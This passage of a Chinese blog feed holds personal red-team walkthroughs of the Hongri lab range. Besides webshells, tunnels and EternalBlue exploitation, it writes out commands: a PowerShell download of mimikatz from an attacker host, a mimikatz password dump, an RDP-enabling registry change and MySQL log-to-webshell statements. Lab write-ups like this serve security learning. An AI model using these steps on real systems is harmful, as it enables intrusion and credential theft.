alt="image-20240610130046803"></p><p>漏洞利用，直接getshell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130159949.png" alt="image-20240610130159949"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130225005.png" alt="image-20240610130225005"></p><p>这个不是root权限，直接放弃，可能有目录读取</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130238977.png" alt="image-20240610130238977"></p><p>tomcat漏洞利用，put写入文件，直接写入jsp的shell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130313075.png" alt="image-20240610130313075"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130317044.png" alt="image-20240610130317044"></p><p>写入shell，这里需要简单的绕过</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130323877.png" alt="image-20240610130323877"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130404448.png" alt="image-20240610130404448"></p><p>哥斯拉连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130348530.png" alt="image-20240610130348530"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130413481.png" alt="image-20240610130413481"></p><p>开启监听，反弹</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130427424.png" alt="image-20240610130427424"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130430351.png" alt="image-20240610130430351"></p><p>这是一个docker环境</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130439858.png" alt="image-20240610130439858"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130443393.png" alt="image-20240610130443393"></p><p>查看教程，逃逸</p><p><a href="http://www.zlprogram.com/Show/36/HYYX68M9.shtml">http://www.zlprogram.com/Show/36/HYYX68M9.shtml</a></p><p>这里将磁盘挂在到自己创建的文件里边，然后发现存在逃逸，写入ssh公钥</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130453272.png" alt="image-20240610130453272"></p><p>创建公钥私钥</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130459144.png" alt="image-20240610130459144"></p><p>然后将内容写入在家目录的.ssh中</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130506688.png" alt="image-20240610130506688"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130512662.png" alt="image-20240610130512662"></p><p>方法1，在kali创建公钥和私钥，然后传到靶机，使用 ssh -i[私钥] 参数连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130531270.png" alt="image-20240610130531270"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130534319.png" alt="image-20240610130534319"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130537785.png" alt="image-20240610130537785"></p><p>方法2，因为可以修改文件，所以说直接吧相同版本中的Ubuntu中新建的用户里边的password和shadow用户复制到etc的对应的文件中</p><p>方法3</p><p>Docker逃逸漏洞目前已知有</p><ul><li><p>Dirty     Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞</p></li><li><p>CVE-2019-5736</p></li><li><p>emote     api 未授权访问</p></li></ul><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130555458.png" alt="image-20240610130555458"></p><p>最后2个</p><p><a href="https://blog.csdn.net/qq_36197704/article/details/122109838">https://blog.csdn.net/qq_36197704/article/details/122109838</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130609331.png" alt="image-20240610130609331"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130615554.png" alt="image-20240610130615554"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130618409.png" alt="image-20240610130618409"></p><p>但是但是！！！</p><p>这里我复现3个，一个都没成功！！！</p><p>直接Ubuntu:ubuntu连接了。。。。。😭</p><h1 id="3、内网"><a href="#3、内网" class="headerlink" title="3、内网"></a>3、内网</h1><p>假装逃逸出来后，生一个马子</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130651507.png" alt="image-20240610130651507"></p><p>开启监听，马上传上去，运行，上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130658743.png" alt="image-20240610130658743"></p><p>发现内网网段</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130704855.png" alt="image-20240610130704855"></p><p>开启msf的自动路由功能</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130709653.png" alt="image-20240610130709653"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130715960.png" alt="image-20240610130715960"></p><p>上传fscan，使用fscan搜集内网网段的内容，2台存在永恒之蓝漏洞</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130729202.png" alt="image-20240610130729202"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130733976.png" alt="image-20240610130733976"></p><p>检测，发现漏洞存在</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130746921.png" alt="image-20240610130746921"></p><p>开启msf的socks代理，proxychains代理监听1080</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130753120.png" alt="image-20240610130753120"></p><p>这里一直失败，永恒之蓝两台机器，已经连过去了，但是一直连接失败，怀疑是代理问题，换个代理吧</p><p>Ew内网代理</p><p>kali</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130804867.png" alt="image-20240610130804867"></p><p>靶机</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130811562.png" alt="image-20240610130811562"></p><p>访问成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130818706.png" alt="image-20240610130818706"></p><p>但是使用msf框架利用永恒之蓝攻击失败，这里貌似运气成分把，需要多攻击几次，不过懒得弄了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130845289.png" alt="image-20240610130845289"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130848069.png" alt="image-20240610130848069"></p><p>使用chisel</p><p>Ubuntu（出网靶机）是服务器</p><p>.&#x2F;chisel servers -p 8888 –socke5</p><p>kali是攻击机，也就是需要接受出网靶机的端口(10.87是出网靶机的IP)</p><p>.&#x2F;chisel client 192.168.10.87:8888 socks</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130858420.png" alt="image-20240610130858420"></p><p>kali</p><p>1080监听端口，然后nmap扫描，可以扫描</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130910718.png" alt="image-20240610130910718"></p><p>Msf，永恒之蓝Windows7，成功拿下</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130917611.png" alt="image-20240610130917611"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130923599.png" alt="image-20240610130923599"></p><p>Load_kiw查看账号密码，但是这里我想进shell一直进不去，timeout，估计又是隧道的问题，这里暂时没有想到解决办法，所以放弃。</p><p>一般关闭防火墙后打开3389或者使用psexec和wmiexec都可以连接，然后上传mimikatz查看管理员密码，在使用2个工具关闭防火墙就可以拿下域了吧。。。。</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130950869.png" alt="image-20240610130950869"></p><p>关关难，关关过，虽然失败了，但是也会学会了工具使用了</p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（3）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A53/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A53/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123836301.png" alt="image-20240610123836301"></p><p>外网我是使用桥接模式，因为两台电脑，方便连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123845159.png" alt="image-20240610123845159"></p><h1 id="2、web打点"><a href="#2、web打点" class="headerlink" title="2、web打点"></a>2、web打点</h1><p>端口扫描，存在3个开放端口，访问80</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123922048.png" alt="image-20240610123922048"></p><p>顺便使用nmap扫一扫漏洞，发现是joomla的框架</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123929138.png" alt="image-20240610123929138"></p><p>扫描路径，存在配置文件泄漏</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123939201.png" alt="image-20240610123939201"></p><p>连接数据库</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610123947371.png" alt="image-20240610123947371"></p><p>查看数据库内容，这里使用joomla常见利用，手动添加一个管理员进去，然后登录后台即可</p><p>参考！<a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124109963.png" alt="image-20240610124109963"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124128124.png" alt="image-20240610124128124"></p><p>添加admin&#x2F;secret的管理员</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124133828.png" alt="image-20240610124133828"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124206510.png" alt="image-20240610124206510"></p><p>登录后台后，在templates中可以添加模板，创建shell.php</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124213951.png" alt="image-20240610124213951"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124227590.png" alt="image-20240610124227590"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124239424.png" alt="image-20240610124239424"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124245959.png" alt="image-20240610124245959"></p><p>成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124253288.png" alt="image-20240610124253288"></p><p>蚁剑访问，但是执行命令的时候，存在报错</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124305955.png" alt="image-20240610124305955"></p><p>直接使用蚁剑自带的绕过，绕过后执行命令，成功执行</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124312623.png" alt="image-20240610124312623"></p><p>这里需要信息收集，在 tmp&#x2F;mysql中存在账号密码，使用ssh连接</p><p>开始提权</p><p>提权：使用脚本<a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124347999.png" alt="image-20240610124347999"></p><p>脏牛提权</p><p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p><p>这里使用poc创建了一个用户 firefart:password</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124358165.png" alt="image-20240610124358165"></p><h1 id="3、内网探测"><a href="#3、内网探测" class="headerlink" title="3、内网探测"></a>3、内网探测</h1><p>msf生成一个马</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124513971.png" alt="image-20240610124513971"></p><p>传到靶机上，给予权限，然后上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124521472.png" alt="image-20240610124521472"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124528827.png" alt="image-20240610124528827"></p><p>开启自动路由，反向代理出来</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124537434.png" alt="image-20240610124537434"></p><p>将已知的靶场ip都检测一下，<strong>445端口</strong>，可以尝试爆破，这里先测试一下代理是否成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124546196.png" alt="image-20240610124546196"></p><p>使用隧道，转发出来，然后curl测试内网站点是否能访问</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124554605.png" alt="image-20240610124554605"></p><p>开始爆破，设置字典，这里方便测试，将域密码也放入测试，爆破成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124848413.png" alt="image-20240610124848413"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610124859257.png" alt="image-20240610124859257"></p><h2 id="wmiexec-smb-利用"><a href="#wmiexec-smb-利用" class="headerlink" title="wmiexec smb****利用"></a><strong>wmiexec smb****利用</strong></h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">WMI介绍：<br>WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；用户可以使用 WMI 管理本地和远程计算机。     <br><br>作用：WMI以CIMOM为基础，CIMOM即公共信息模型对象管理器（Common Information Model Object Manager），是一个描述操作系统构成单元的对象数据库，为MMC和脚本程序提供了一个访问操作系统构成单元的公共接口。有了WMI，工具软件和脚本程序访问操作系统的不同部分时不需要使用不同的API；相反，操作系统的不同部分都可以插入WMI，工具软件和脚本程序可以方便地读写WMI。<br><br> WMI 可以管理本地和远程计算机，攻击者使用 wmi 攻击时 windows 系统默认不会在日志中记录这些操作，可以做到无日志、攻击脚本无需写入到磁盘，增加了隐蔽性。<br> <br> wmiexec下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CoreSecurity/im</span>packet<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/examples/</span>wmiexec.py<br></code></pre></div></td></tr></table></figure><p>连接个个内网</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125011175.png" alt="image-20240610125011175"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125014139.png" alt="image-20240610125014139"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125017213.png" alt="image-20240610125017213"></p><p>全部成功，但是域不知道账号密码，使用一台内网主机，代理出来后使用rdesktop连接 </p><p>Administrator:123qwe!ASD</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125032909.png" alt="image-20240610125032909"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125043986.png" alt="image-20240610125043986"></p><p>上传Mimikatz在其中一台开放web访问的机子中，然后让这台机子直接访问网址下载</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125100172.png" alt="image-20240610125100172"></p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</p><p>powershell (new-object Net.WebClient).DownloadFile(‘<a href="http://192.168.93.100:8888/kiwikatz.exe','C:/mimikatz.exe">http://192.168.93.100:8888/kiwikatz.exe&#39;,&#39;C:\mimikatz.exe</a>‘)</p><p>mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords” “exit” &gt; log.log</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125423289.png" alt="image-20240610125423289"></p><p>读取密码</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125434209.png" alt="image-20240610125434209"></p><p>wmiexec连接，成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125441128.png" alt="image-20240610125441128"></p><p>拿下域服务器</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A53/image-20240610125447765.png" alt="image-20240610125447765"></p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（2）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A52/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A52/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p>配置IP，自己任意配置，然后web和PC存在外网ip和内网ip，也就是需要2张网卡，DC域存在内网，无外网</p><p>以下图片仅供参考</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610122919628.png" alt="image-20240610122919628"></p><p>密码为 1qaz@WSX</p><p>需要开启</p><p>C:\Oracle\Middleware\user_projects\domains\base_domain\bin\strartWebLogic.cmd</p><h1 id="2、外网打点"><a href="#2、外网打点" class="headerlink" title="2、外网打点"></a>2、外网打点</h1><p>已知一台的ip为 <em>192.168.10.75 为web服务器</em> 另一台为 <em>192.168.10.74 为办公员工区</em></p><p>nmap扫描,<strong>.75ip扫描结果，存在永恒之蓝</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123039595.png" alt="image-20240610123039595"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123051754.png" alt="image-20240610123051754"></p><p>二次确认，.74扫描结果，使用–script&#x3D;vuln 扫描到永恒之蓝</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123137591.png" alt="image-20240610123137591"></p><p>使用dirsearch查询路径，发现login，通过页面webloginc，利用漏洞工具查询</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123148908.png" alt="image-20240610123148908"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123211436.png" alt="image-20240610123211436"></p><p>验证漏洞，存在漏洞，上传一句话木马，然后哥斯拉上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123219856.png" alt="image-20240610123219856"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123303872.png" alt="image-20240610123303872"></p><p>连接成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123313051.png" alt="image-20240610123313051"></p><p>查看目录结构</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123321691.png" alt="image-20240610123321691"></p><p>因为这里默认存在360，需要免杀绕过，免杀只会用别人现成的工具，自己并不会免杀😭，所以手动关闭</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123409748.png" alt="image-20240610123409748"></p><p>使用提权一通乱提，system权限</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123417856.png" alt="image-20240610123417856"></p><p>至此，外网服务器已经拿下，接下来是内网</p><h1 id="3、内网"><a href="#3、内网" class="headerlink" title="3、内网"></a>3、内网</h1><p>先让CS和msf关联起来</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-built_in">CS</span>创建一个foreign监听，<span class="hljs-built_in">ip</span>和端口需要和msf的一致<br><br>然后msf 使用 exploit/multi/handler payload： windows/mterpreter/revers_http<br><br>然后设置<span class="hljs-built_in">IP</span>和port，需要和<span class="hljs-built_in">CS</span>的一致<br><br>在使用spwan监听到<span class="hljs-built_in">CS</span>的foreign，然后查看msf的上线情况<br></code></pre></div></td></tr></table></figure><p>msf的路由模式，访问内网不出网内容，在session中使用自动路由</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123553893.png" alt="image-20240610123553893"></p><p>使用msf查看网段，使用arp_scanner模块，设置网段，设置session，然后run，这里和cs的portscan功能差不多10.10.10.0&#x2F;24</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123559837.png" alt="image-20240610123559837"></p><p>查看是否存在永恒之蓝漏洞</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123620870.png" alt="image-20240610123620870"></p><p>MSF上线CS</p><p>cs创建一个监听，端口为80</p><p>然后msf使用payload注入模块，然后设置payload，为reverse_http，设置session，要上线的session，这里只能上线出网的内容</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123631562.png" alt="image-20240610123631562"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123636701.png" alt="image-20240610123636701"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123642033.png" alt="image-20240610123642033"></p><p>回到msf，因为路由了，所以说直接使用永恒之蓝 windows&#x2F;smb&#x2F;ms17_010_psexec 设置 payload windows&#x2F;meterpreter&#x2F;bind_tcp，然后run就行，上线域控制器，拿下内网</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123650423.png" alt="image-20240610123650423"></p><p>.&#x2F;de1ay:1qaz@WSX 使用rdesktop连接就行了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A52/image-20240610123707655.png" alt="image-20240610123707655"></p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（1）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A51/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A51/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p>红日靶场中存在一台Windows7，一台Windows server 2003 和一台Windows server 2008</p><p>其中Windows7部署两张网卡 一张仅主机模式，用于内网， 一张看情况，用于外网，这里我是桥接模式</p><p>两台Windows server 是仅主机模式，存在于内网环境中。</p><p>部署完毕后重启</p><p><strong>phpstudy，启动</strong></p><p>开始打靶</p><h1 id="2、web打点"><a href="#2、web打点" class="headerlink" title="2、web打点"></a>2、web打点</h1><p>通过信息收集，发现探针</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610112901058.png" alt="01"></p><p>然后尝试弱口令 root&#x2F;root 测试成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610112917532.png" alt="image-20240610112917532"></p><p>扫描目录，发现phpMyAdmin，使用root&#x2F;root登录</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610112944031.png" alt="image-20240610112944031"></p><p>登录成功，这里可以想到使用phpMyAdmin来getshell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113012092.png" alt="image-20240610113012092"></p><p>通过phpinfo报错页面查看到绝对路径，然后使用数据库写入shell，这里有多重方法，这里选择使用日志写入</p><p>&#96;Show variables like ‘%general%’; 查看功能是否开启</p><p>Set global general_log &#x3D; on; 开启日志功能</p><p>Set global general_log_file &#x3D; “c:\phpstuty\www\1.php”; 设置日志输出位置，前提是知道绝对路径&#96;</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113136786.png" alt="image-20240610113136786"></p><p>测试PHPinfo，写入成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113145213.png" alt="image-20240610113145213"></p><h1 id="3、初探"><a href="#3、初探" class="headerlink" title="3、初探"></a>3、初探</h1><p>连接蚁剑，权限为administrator</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113229156.png" alt="image-20240610113229156"></p><p>查看防火墙状态，发现打开，然后关闭</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113253799.png" alt="image-20240610113253799"></p><p>生成一个木马，然后传到蚁剑，打开运行，msf上线，方便后续操作</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113301879.png" alt="image-20240610113301879"></p><h1 id="4、深入"><a href="#4、深入" class="headerlink" title="4、深入"></a>4、深入</h1><p>使用msf查看域信息<img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113403698.png" alt="image-20240610113403698"><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113442886.png" alt="image-20240610113442886"></p><p>利用msf打开远程rdp，使用kali的redesktop ip:3389连接，这里连接成功了，没截图</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113412110.png" alt="image-20240610113412110"></p><p>查看arp信息，动态和静态，52网段<img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113454890.png" alt="image-20240610113454890"></p><p>查看域内用户</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113504648.png" alt="image-20240610113504648"></p><p>有内网，直接上cs了</p><p>CS4.0，上传木马，然后传到Windows7后打开上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113531629.png" alt="image-20240610113531629"></p><p>查看域以及对应的ip地址</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113540705.png" alt="image-20240610113540705"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113549428.png" alt="image-20240610113549428"></p><p>使用cs自带的cs提权，直接提取至system权限</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113611647.png" alt="image-20240610113611647"></p><h2 id="与msf关联"><a href="#与msf关联" class="headerlink" title="与msf关联"></a>与msf关联</h2><p>创建forset_http监听，然后然后msf监听对应ip以及端口</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113638905.png" alt="image-20240610113638905"></p><p>使用msf自带的smb扫描工具，然后查询445端口</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113647069.png" alt="image-20240610113647069"></p><p>使用msf模块查看系统中安装了哪些应用，这里顺带一提，实战中估计可以利用一些软件漏洞提权或者其他操作</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113656625.png" alt="image-20240610113656625"></p><h2 id="sockers-反向代理"><a href="#sockers-反向代理" class="headerlink" title="sockers 反向代理"></a>sockers 反向代理</h2><p>使用cs创建隧道，中转-&gt;socker server 然后配置proxychains </p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113819088.png" alt="image-20240610113819088"></p><p>然后使用proxychains firefox 打开火狐 访问 192.168.52.138</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113826214.png" alt="image-20240610113826214"></p><p>成功出网，但是无法将端口转发到metpreter，更换个代理工具，用lcx，然后配置proxychnains firefox 打开192.168.52.138，正常</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113903165.png" alt="image-20240610113903165"></p><p>回到msf</p><p>load kiwi 加载kiwi，</p><p>creds_all 显示明文密码</p><p>creds_kerberos 显示所有</p><p>这里内网横向使用CS自带的工具，创建一个smb监听器，然后使用jump-psexce，使用使用hashdump出来的管理员明文登录</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113925837.png" alt="image-20240610113925837"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113940093.png" alt="image-20240610113940093"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A51/image-20240610113954217.png" alt="image-20240610113954217"></p><h6 id="博客目的是为了将我的onenot中之前的学习笔记备份至github中，所以内容所显潦草🫡"><a href="#博客目的是为了将我的onenot中之前的学习笔记备份至github中，所以内容所显潦草🫡" class="headerlink" title="博客目的是为了将我的onenot中之前的学习笔记备份至github中，所以内容所显潦草🫡"></a>博客目的是为了将我的onenot中之前的学习笔记备份至github中，所以内容所显潦草🫡</h6>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>me</title>
    <link href="/2002/10/18/1/"/>
    <url>/2002/10/18/1/</url>
    
    <content type="html"><![CDATA[<p><img src="/2002/10/18/1/111.jpg" alt="111"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
